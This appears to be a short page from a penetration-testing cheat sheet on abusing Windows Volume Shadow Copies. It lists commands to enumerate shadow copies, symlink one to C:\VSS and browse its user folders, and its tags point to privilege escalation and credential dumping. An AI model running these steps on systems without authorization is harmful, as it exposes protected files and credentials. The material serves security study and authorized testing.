---
title: "Volume Shadow Copies"
date: 2024-8-22
tags: ["Volume Shadow Copies", "privesc", "Windows", "secretsdump", "vsc"]
---

---
### Abuse #1: Recover data from shadow copies

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Check

<div>

```powershell
vssadmin list shadows
```

</div>

#### 2. Create symlink and expose the volume

<div>

```powershell
cmd /c mklink /d C:\VSS <SHADOW_COPY_VOLUME_PATH>
```

</div>

#### 3. Access

<div>

```powershell
ls C:\VSS\Users
```

</div>

{{< /tabcontent >}}

<br>